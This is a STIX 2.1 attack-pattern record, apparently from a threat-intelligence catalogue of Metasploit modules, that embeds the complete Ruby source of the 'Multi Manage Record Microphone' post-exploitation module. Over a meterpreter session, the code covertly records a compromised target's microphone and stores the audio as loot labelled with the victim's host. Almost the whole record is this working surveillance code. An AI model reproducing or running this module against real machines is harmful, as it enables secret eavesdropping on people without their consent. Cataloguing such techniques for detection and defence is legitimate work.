{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4cfecf33-7f41-442d-93e6-d1ea03b3012b",
    "created": "2024-08-14T16:33:18.008862Z",
    "modified": "2024-08-14T16:33:18.008865Z",
    "name": "Multi Manage Record Microphone",
    "description": " This module will enable and record your target's microphone. For non-Windows targets, please use Java meterpreter to be able to use this feature.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/record_mic.rb",
            "external_id": "record_mic.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage Record Microphone',\n        'Description' => %q{\n          This module will enable and record your target's microphone.\n          For non-Windows targets, please use Java meterpreter to be\n          able to use this feature.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => %w[linux osx win],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_webcam_*\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('DURATION', [false, 'Number of seconds to record', 5])\n      ]\n    )\n  end\n\n  def rhost\n    client.sock.peerhost\n  end\n\n  def progress\n    duration = datastore['DURATION']\n    m = duration / 10\n    m = 1 if m == 0\n\n    duration.times do |i|\n      if i % m == 0\n        p = ((Float((i == 0) ? 1 : i + 1) / duration) * 100).round\n        print_status(\"#{rhost} - #{p}%...\")\n      end\n      select(nil, nil, nil, 1)\n    end\n  end\n\n  def run\n    if client.nil?\n      print_error(\"Invalid session ID selected. Make sure the host isn't dead.\")\n      return\n    end\n\n    data = nil\n\n    begin\n      t = framework.threads.spawn('prog', false) { progress }\n      data = client.webcam.record_mic(datastore['DURATION'])\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(e.message)\n      return\n    ensure\n      t.kill\n    end\n\n    if data\n      print_status(\"#{rhost} - Audio size: (#{data.length} bytes)\")\n      p = store_loot(\n        \"#{rhost}.audio\",\n        'application/octet-stream',\n        rhost,\n        data,\n        \"#{rhost}_audio.wav\",\n        \"#{rhost} Audio Recording\"\n      )\n\n      print_good(\"#{rhost} - Audio recording saved: #{p}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[linux osx win]"
    ]
}